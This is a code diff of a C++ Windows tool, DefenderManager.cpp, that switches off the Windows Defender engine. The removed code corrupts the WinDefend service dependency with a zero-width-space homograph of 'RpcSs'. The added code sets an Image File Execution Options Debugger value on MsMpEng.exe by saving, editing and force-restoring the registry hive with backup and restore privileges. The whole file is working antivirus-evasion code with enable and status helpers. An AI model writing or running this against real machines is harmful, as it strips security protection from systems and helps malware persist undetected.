@@ -1,312 +1,348 @@
-// Implementation of Windows Defender Security Engine management
+// DefenderManager.cpp
+// Windows Defender engine control via IFEO offline hive manipulation.
 
 #include "DefenderManager.h"
 #include "common.h"
-#include <filesystem>
-#include <algorithm>
-#include <iostream>
 
-using namespace std;
+#include <tlhelp32.h>
+
 namespace fs = std::filesystem;
 
-// Console color helper (using existing SetColor function from main application)
-extern void SetColor(int color);
-
 // ============================================================================
-// PUBLIC INTERFACE IMPLEMENTATION
+// PUBLIC INTERFACE
 // ============================================================================
 
-// Disables Windows Defender security engine by modifying registry dependencies
-bool DefenderManager::DisableSecurityEngine() noexcept 
+bool DefenderManager::DisableSecurityEngine() noexcept
 {
-    std::wcout << L"Disabling Windows Security Engine...\n";
-    return ModifySecurityEngine(false);
-}
+    std::wcout << L"[*] Adding IFEO block for MsMpEng.exe...\n";
 
-// Enables Windows Defender security engine by modifying registry dependencies
-bool DefenderManager::EnableSecurityEngine() noexcept 
-{
-    std::wcout << L"Enabling Windows Security Engine...\n";
-    return ModifySecurityEngine(true);
-}
-
-// Queries current Windows Defender state by checking RpcSs (enabled) - Homograph Attack
-DefenderManager::SecurityState DefenderManager::GetSecurityEngineStatus() noexcept 
-{
-    try {
-        HKEY key;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINDEFEND_KEY, 0, KEY_READ, &key) != ERROR_SUCCESS) {
-            return SecurityState::UNKNOWN;
-        }
-        
-        auto values = ReadMultiString(key, DEPEND_VALUE);
-        RegCloseKey(key);
-        
-        if (values.empty()) return SecurityState::UNKNOWN;
-        
-        // Check if RpcSs (active) or RpcSs\x200B (inactive) is present
-        bool hasActive = find(values.begin(), values.end(), RPC_SERVICE_ACTIVE) != values.end();
-        bool hasInactive = find(values.begin(), values.end(), RPC_SERVICE_INACTIVE) != values.end();
-        
-        if (hasActive) return SecurityState::ENABLED;
-        if (hasInactive) return SecurityState::DISABLED;
-        
-        return SecurityState::UNKNOWN;
-    }
-    catch (...) {
-        return SecurityState::UNKNOWN;
-    }
-}
-
-// ============================================================================
-// CORE OPERATIONS IMPLEMENTATION
-// ============================================================================
-
-// Core registry manipulation logic - creates snapshot, modifies dependencies, and restores atomically
-bool DefenderManager::ModifySecurityEngine(bool enable) noexcept 
-{
-    try {
-        // Enable required privileges first
-        if (!EnableRequiredPrivileges()) {
-            std::wcout << L"Failed to enable required privileges - run as administrator\n";
-            return false;
-        }
-        
-        // Create registry working context
-        RegistryContext ctx;
-        if (!CreateRegistrySnapshot(ctx)) {
-            std::wcout << L"Failed to create registry snapshot\n";
-            return false;
-        }
-        
-        // Modify defender dependencies
-        if (!ModifyDefenderDependencies(ctx, enable)) {
-            std::wcout << L"Failed to modify Defender dependencies\n";
-            return false;
-        }
-        
-        // Restore modified registry
-        if (!RestoreRegistrySnapshot(ctx)) {
-            std::wcout << L"Failed to restore registry snapshot\n";
-            return false;
-        }
-        
-        std::wcout << L"Security engine " << (enable ? L"enabled" : L"disabled") << L" successfully\n";
-        std::wcout << L"System restart required to apply changes\n";
-        return true;
-    }
-    catch (...) {
-        std::wcout << L"Exception in ModifySecurityEngine\n";
+    if (!EnableRequiredPrivileges()) {
+        std::wcout << L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME\n";
         return false;
     }
+
+    HiveContext ctx;
+    if (!CreateIFEOSnapshot(ctx)) {
+        std::wcout << L"[!] Failed to create IFEO hive snapshot\n";
+        return false;
+    }
+    if (!ModifyMsMpEngIFEO(ctx, true)) {
+        std::wcout << L"[!] Failed to set Debugger value in temp hive\n";
+        return false;
+    }
+    if (!RestoreIFEOSnapshot(ctx)) {
+        std::wcout << L"[!] Failed to restore IFEO hive\n";
+        return false;
+    }
+
+    std::wcout << L"[+] IFEO block set (Debugger=systray.exe on MsMpEng.exe)\n";
+    std::wcout << L"[!] System restart required — the engine is currently running\n";
+    return true;
 }
 
-// Creates temporary registry snapshot by saving Services hive to temp file and loading as HKLM\Temp
-bool DefenderManager::CreateRegistrySnapshot(RegistryContext& ctx) noexcept 
+bool DefenderManager::EnableSecurityEngine() noexcept
+{
+    std::wcout << L"[*] Removing IFEO block for MsMpEng.exe...\n";
+
+    if (!EnableRequiredPrivileges()) {
+        std::wcout << L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME\n";
+        return false;
+    }
+
+    HiveContext ctx;
+    if (!CreateIFEOSnapshot(ctx)) {
+        std::wcout << L"[!] Failed to create IFEO hive snapshot\n";
+        return false;
+    }
+    if (!ModifyMsMpEngIFEO(ctx, false)) {
+        std::wcout << L"[!] Failed to remove Debugger value from temp hive\n";
+        return false;
+    }
+    if (!RestoreIFEOSnapshot(ctx)) {
+        std::wcout << L"[!] Failed to restore IFEO hive\n";
+        return false;
+    }
+
+    std::wcout << L"[+] IFEO block removed\n";
+
+    std::wcout << L"[*] Starting WinDefend service...\n";
+    if (StartWinDefend()) {
+        std::wcout << L"[+] WinDefend started — MsMpEng.exe will launch shortly\n";
+    } else {
+        std::wcout << L"[-] WinDefend could not be started (service may be absent or disabled)\n";
+    }
+
+    return true;
+}
+
+// ============================================================================
+// STATUS
+// ============================================================================
+
+DefenderManager::DefenderStatus DefenderManager::QueryStatus() noexcept
+{
+    DefenderStatus s{};
+    s.state           = SecurityState::UNKNOWN;
+    s.ifeoBlocked     = false;
+    s.winDefendRunning = false;
+    s.msmpengRunning  = false;
+
+    // --- IFEO check (read-only, no elevation needed) ---
+    HKEY hKey = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MSMPENG_SUBKEY,
+                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t buf[MAX_PATH] = {};
+        DWORD sz   = sizeof(buf);
+        DWORD type = 0;
+        if (RegQueryValueExW(hKey, DEBUGGER_VALUE, nullptr, &type,
+                             reinterpret_cast<LPBYTE>(buf), &sz) == ERROR_SUCCESS
+            && type == REG_SZ) {
+            s.ifeoBlocked   = true;
+            s.ifeoDebugger  = buf;
+        }
+        RegCloseKey(hKey);
+    }
+
+    // --- WinDefend service state ---
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (hSCM) {
+        SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC, SERVICE_QUERY_STATUS);
+        if (hSvc) {
+            SERVICE_STATUS ss{};
+            if (QueryServiceStatus(hSvc, &ss)) {
+                s.winDefendRunning = (ss.dwCurrentState == SERVICE_RUNNING);
+                if (ss.dwCurrentState == SERVICE_RUNNING && !s.ifeoBlocked)
+                    s.state = SecurityState::ACTIVE;
+                else if (s.ifeoBlocked)
+                    s.state = SecurityState::IFEO_BLOCKED;
+                else
+                    s.state = SecurityState::INACTIVE;
+            }
+            CloseServiceHandle(hSvc);
+        } else {
+            // Service handle not found — Defender may not be installed.
+            s.state = (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
+                      ? SecurityState::NOT_INSTALLED
+                      : SecurityState::UNKNOWN;
+        }
+        CloseServiceHandle(hSCM);
+    }
+
+    // --- MsMpEng.exe process ---
+    s.msmpengRunning = IsMsMpEngRunning();
+
+    // Refine state: if IFEO block is set but engine is currently alive, still
+    // report IFEO_BLOCKED — it will stay dead after the next restart.
+    if (s.ifeoBlocked)
+        s.state = SecurityState::IFEO_BLOCKED;
+
+    return s;
+}
+
+DefenderManager::SecurityState DefenderManager::GetSecurityEngineStatus() noexcept
+{
+    return QueryStatus().state;
+}
+
+// ============================================================================
+// PRIVATE — HIVE OPERATIONS
+// ============================================================================
+
+bool DefenderManager::EnableRequiredPrivileges() noexcept
+{
+    return PrivilegeUtils::EnablePrivilege(SE_BACKUP_NAME) &&
+           PrivilegeUtils::EnablePrivilege(SE_RESTORE_NAME);
+}
+
+bool DefenderManager::CreateIFEOSnapshot(HiveContext& ctx) noexcept
 {
     ctx.tempPath = ::GetSystemTempPath();
     if (ctx.tempPath.empty()) {
-        std::wcout << L"Failed to get system temp path\n";
+        std::wcout << L"[!] Cannot resolve system temp path\n";
         return false;
     }
-    
-    // Ensure temp directory exists and is writable
-    if (!PathUtils::ValidateDirectoryWritable(ctx.tempPath)) {
-        std::wcout << L"Cannot write to temp directory: " << ctx.tempPath << L"\n";
+
+    ctx.hiveFile = ctx.tempPath + L"Ifeo.hiv";
+
+    // Remove stale hive file.
+    if (fs::exists(ctx.hiveFile))
+        DeleteFileW(ctx.hiveFile.c_str());
+
+    // Unload any leftover TempIFEO mount.
+    HKEY hCheck = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
+                      0, KEY_READ, &hCheck) == ERROR_SUCCESS) {
+        RegCloseKey(hCheck);
+        RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME);
+    }
+
+    // Save the live IFEO subtree to disk.
+    HKEY hIfeo = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
+                      0, KEY_READ, &hIfeo) != ERROR_SUCCESS) {
+        std::wcout << L"[!] Cannot open IFEO registry key\n";
         return false;
     }
-    
-    ctx.hiveFile = ctx.tempPath + L"Services.hiv";
-    
-    // Clean up any existing hive file
-    if (fs::exists(ctx.hiveFile) && !DeleteFileW(ctx.hiveFile.c_str())) {
-        std::wcout << L"Failed to delete existing hive file\n";
+
+    LONG r = RegSaveKeyExW(hIfeo, ctx.hiveFile.c_str(), nullptr, REG_LATEST_FORMAT);
+    RegCloseKey(hIfeo);
+    if (r != ERROR_SUCCESS) {
+        std::wcout << L"[!] RegSaveKeyEx failed: " << r << L"\n";
         return false;
     }
-    
-    // Unload any existing temp registry hive
-    HKEY tempCheck;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Temp", 0, KEY_READ, &tempCheck) == ERROR_SUCCESS) {
-        RegCloseKey(tempCheck);
-        RegUnLoadKeyW(HKEY_LOCAL_MACHINE, L"Temp");
-    }
-    
-    // Save current services registry hive
-    HKEY servicesKey;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SERVICES_KEY, 0, KEY_READ, &servicesKey) != ERROR_SUCCESS) {
-        std::wcout << L"Failed to open Services registry key\n";
+
+    // Mount the saved hive as HKLM\TempIFEO.
+    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
+                    ctx.hiveFile.c_str()) != ERROR_SUCCESS) {
+        std::wcout << L"[!] RegLoadKey failed\n";
         return false;
     }
-    
-    LONG result = RegSaveKeyExW(servicesKey, ctx.hiveFile.c_str(), nullptr, REG_LATEST_FORMAT);
-    RegCloseKey(servicesKey);
-    
-    if (result != ERROR_SUCCESS) {
-        std::wcout << L"Failed to save registry hive: " << result << L"\n";
-        return false;
-    }
-    
-    // Load saved hive as temporary key
-    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, L"Temp", ctx.hiveFile.c_str()) != ERROR_SUCCESS) {
-        std::wcout << L"Failed to load registry hive as temp key\n";
-        return false;
-    }
-    
+
     return true;
 }
 
-// Modifies Windows Defender service dependencies in temp registry by transforming RpcSs↔RpcSs\x200B
-bool DefenderManager::ModifyDefenderDependencies(const RegistryContext& ctx, bool enable) noexcept 
+bool DefenderManager::ModifyMsMpEngIFEO(const HiveContext& /*ctx*/, bool addBlock) noexcept
 {
-    HKEY tempKey;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Temp\\WinDefend", 0, KEY_READ | KEY_WRITE, &tempKey) != ERROR_SUCCESS) {
-        std::wcout << L"Failed to open temporary WinDefend key\n";
-        return false;
-    }
-    
-    auto values = ReadMultiString(tempKey, DEPEND_VALUE);
-    if (values.empty()) {
-        std::wcout << L"No DependOnService values found\n";
-        RegCloseKey(tempKey);
-        return false;
-    }
-    
-    // Transform RPC service dependency
-    for (auto& value : values) {
-        if (enable && value == RPC_SERVICE_INACTIVE) {
-            value = RPC_SERVICE_ACTIVE;  // RpcSs\x200B -> RpcSs (enable)
+    // Path inside the mounted temp hive: TempIFEO\MsMpEng.exe
+    const std::wstring keyPath = std::wstring(TEMP_HIVE_NAME) + L"\\MsMpEng.exe";
+
+    if (addBlock) {
+        HKEY hKey = nullptr;
+        LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+                                 0, nullptr, REG_OPTION_NON_VOLATILE,
+                                 KEY_WRITE, nullptr, &hKey, nullptr);
+        if (r != ERROR_SUCCESS) {
+            std::wcout << L"[!] RegCreateKeyEx on TempIFEO\\MsMpEng.exe failed: " << r << L"\n";
+            return false;
         }
-        else if (!enable && value == RPC_SERVICE_ACTIVE) {
-            value = RPC_SERVICE_INACTIVE; // RpcSs -> RpcSs\x200B (disable)
+        const DWORD sz = static_cast<DWORD>((wcslen(DEBUGGER_PAYLOAD) + 1) * sizeof(wchar_t));
+        r = RegSetValueExW(hKey, DEBUGGER_VALUE, 0, REG_SZ,
+                           reinterpret_cast<const BYTE*>(DEBUGGER_PAYLOAD), sz);
+        RegCloseKey(hKey);
+        if (r != ERROR_SUCCESS) {
+            std::wcout << L"[!] RegSetValueEx Debugger failed: " << r << L"\n";
+            return false;
         }
+    } else {
+        // Remove Debugger value first; then try to delete the key (leaf only).
+        HKEY hKey = nullptr;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            RegDeleteValueW(hKey, DEBUGGER_VALUE);
+            RegCloseKey(hKey);
+        }
+        // Best-effort key deletion (fails silently if the key has other values).
+        RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
     }
-    
-    bool success = WriteMultiString(tempKey, DEPEND_VALUE, values);
-    RegCloseKey(tempKey);
-    
-    if (!success) {
-        std::wcout << L"Failed to write modified dependency values\n";
-        return false;
-    }
-    
+
     return true;
 }
 
-// Restores modified registry snapshot to live system by unloading temp hive and forcing restore
-bool DefenderManager::RestoreRegistrySnapshot(const RegistryContext& ctx) noexcept 
+bool DefenderManager::RestoreIFEOSnapshot(const HiveContext& ctx) noexcept
 {
-    // Unload temporary registry hive
-    if (RegUnLoadKeyW(HKEY_LOCAL_MACHINE, L"Temp") != ERROR_SUCCESS) {
-        std::wcout << L"Warning: Failed to unload temporary registry hive\n";
-    }
-    
-    // Restore modified hive to live registry
-    HKEY servicesKey;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SERVICES_KEY, 0, KEY_WRITE, &servicesKey) != ERROR_SUCCESS) {
-        std::wcout << L"Failed to open Services key for restore\n";
+    // Flush and unmount the temp hive.
+    if (RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME) != ERROR_SUCCESS)
+        std::wcout << L"[!] Warning: RegUnLoadKey(TempIFEO) failed\n";
+
+    // Force-restore the modified hive over the live IFEO subtree.
+    HKEY hIfeo = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
+                      0, KEY_WRITE, &hIfeo) != ERROR_SUCCESS) {
+        std::wcout << L"[!] Cannot open IFEO key for restore\n";
         return false;
     }
-    
-    LONG result = RegRestoreKeyW(servicesKey, ctx.hiveFile.c_str(), REG_FORCE_RESTORE);
-    RegCloseKey(servicesKey);
-    
-    if (result != ERROR_SUCCESS) {
-        std::wcout << L"Failed to restore modified registry hive: " << result << L"\n";
+
+    LONG r = RegRestoreKeyW(hIfeo, ctx.hiveFile.c_str(), REG_FORCE_RESTORE);
+    RegCloseKey(hIfeo);
+    if (r != ERROR_SUCCESS) {
+        std::wcout << L"[!] RegRestoreKey failed: " << r << L"\n";
         return false;
     }
-    
+
     return true;
 }
 
 // ============================================================================
-// PRIVILEGE MANAGEMENT IMPLEMENTATION
+// PRIVATE — SERVICE & PROCESS HELPERS
 // ============================================================================
 
-// Enables SE_BACKUP_NAME, SE_RESTORE_NAME and SE_LOAD_DRIVER_NAME privileges required for registry operations
-bool DefenderManager::EnableRequiredPrivileges() noexcept 
+bool DefenderManager::StartWinDefend() noexcept
 {
-	return PrivilegeUtils::EnablePrivilege(SE_BACKUP_NAME) &&
-		   PrivilegeUtils::EnablePrivilege(SE_RESTORE_NAME) &&
-		   PrivilegeUtils::EnablePrivilege(SE_LOAD_DRIVER_NAME);
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!hSCM) return false;
+
+    SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC,
+                                  SERVICE_START | SERVICE_QUERY_STATUS);
+    if (!hSvc) {
+        CloseServiceHandle(hSCM);
+        return false;
+    }
+
+    bool ok = StartServiceW(hSvc, 0, nullptr)
+           || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
+
+    CloseServiceHandle(hSvc);
+    CloseServiceHandle(hSCM);
+    return ok;
+}
+
+bool DefenderManager::IsMsMpEngRunning() noexcept
+{
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32W pe{ sizeof(pe) };
+    bool found = false;
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, L"MsMpEng.exe") == 0) {
+                found = true;
+                break;
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return found;
+}
+
+bool DefenderManager::IsWinDefendRunning() noexcept
+{
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!hSCM) return false;
+
+    SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC, SERVICE_QUERY_STATUS);
+    if (!hSvc) { CloseServiceHandle(hSCM); return false; }
+
+    SERVICE_STATUS ss{};
+    bool running = QueryServiceStatus(hSvc, &ss)
+                && ss.dwCurrentState == SERVICE_RUNNING;
+
+    CloseServiceHandle(hSvc);
+    CloseServiceHandle(hSCM);
+    return running;
 }
 
 // ============================================================================
-// HELPER UTILITIES IMPLEMENTATION
+// HIVE CONTEXT CLEANUP
 // ============================================================================
 
-// Reads REG_MULTI_SZ registry value as string vector by parsing null-terminated strings
-vector<wstring> DefenderManager::ReadMultiString(HKEY key, const wstring& valueName) noexcept 
-{
-    DWORD type, size;
-    if (RegQueryValueExW(key, valueName.c_str(), nullptr, &type, nullptr, &size) != ERROR_SUCCESS || 
-        type != REG_MULTI_SZ) {
-        return {};
-    }
-    
-    vector<wchar_t> buffer(size / sizeof(wchar_t));
-    if (RegQueryValueExW(key, valueName.c_str(), nullptr, &type, 
-                        reinterpret_cast<BYTE*>(buffer.data()), &size) != ERROR_SUCCESS) {
-        return {};
-    }
-    
-    vector<wstring> result;
-    const wchar_t* current = buffer.data();
-    
-    while (*current != L'\0') {
-        result.emplace_back(current);
-        current += result.back().size() + 1;
-    }
-    
-    return result;
-}
-
-// Writes string vector to REG_MULTI_SZ registry value with proper double null terminator
-bool DefenderManager::WriteMultiString(HKEY key, const wstring& valueName, 
-                                      const vector<wstring>& values) noexcept 
-{
-    vector<wchar_t> buffer;
-    
-    for (const auto& str : values) {
-        buffer.insert(buffer.end(), str.begin(), str.end());
-        buffer.push_back(L'\0');
-    }
-    buffer.push_back(L'\0'); // Double null terminator
-    
-    return RegSetValueExW(key, valueName.c_str(), 0, REG_MULTI_SZ,
-                         reinterpret_cast<const BYTE*>(buffer.data()),
-                         static_cast<DWORD>(buffer.size() * sizeof(wchar_t))) == ERROR_SUCCESS;
-}
-
-// ============================================================================
-// REGISTRY CONTEXT CLEANUP IMPLEMENTATION
-// ============================================================================
-
-// Cleans up temporary registry files including hive, transaction logs and regtrans-ms files
-void DefenderManager::RegistryContext::Cleanup() noexcept 
+void DefenderManager::HiveContext::Cleanup() noexcept
 {
     if (hiveFile.empty()) return;
-    
-    // Standard cleanup patterns
-    vector<wstring> patterns = {
-        hiveFile,
-        hiveFile + L".LOG1",
-        hiveFile + L".LOG2", 
-        hiveFile + L".blf"
-    };
-    
-    for (const auto& file : patterns) {
-        DeleteFileW(file.c_str());
+
+    for (const auto& path : {
+            hiveFile,
+            hiveFile + L".LOG1",
+            hiveFile + L".LOG2",
+            hiveFile + L".blf" }) {
+        DeleteFileW(path.c_str());
     }
-    
-    // Clean transaction files
+
+    // Remove any .regtrans-ms transaction files in the same directory.
     try {
         for (const auto& entry : fs::directory_iterator(tempPath)) {
-            if (entry.path().extension() == L".regtrans-ms") {
+            if (entry.path().extension() == L".regtrans-ms")
                 DeleteFileW(entry.path().c_str());
-            }
         }
-    }
-    catch (...) {
-        // Ignore cleanup errors
-    }
+    } catch (...) {}
 }
